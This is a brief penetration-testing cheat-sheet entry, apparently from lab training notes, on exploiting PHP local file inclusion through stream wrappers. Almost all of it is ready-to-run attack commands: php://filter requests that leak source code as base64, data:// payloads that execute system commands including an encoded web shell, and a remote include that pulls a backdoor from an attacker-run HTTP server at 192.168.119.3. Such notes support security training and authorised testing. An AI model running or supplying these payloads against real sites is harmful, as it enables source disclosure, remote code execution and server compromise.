---
title: LFI PHP Wrappers
category: initial-access
subcategory: web-attacks
os: linux
command: curl 'target/page=php://filter/convert.base64-encode/resource=admin.php'
tools: curl, base64
---


### php://filter - read source as base64

```bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

### Decode result

```bash
echo "PCFET0NUWVBFIGh0bWw+..." | base64 -d
```

### data:// wrapper - inline PHP execution

```bash
curl "http://target/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

### data:// base64

```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://target/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

### Remote include via http://

```bash
python3 -m http.server 80
curl "http://target/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```
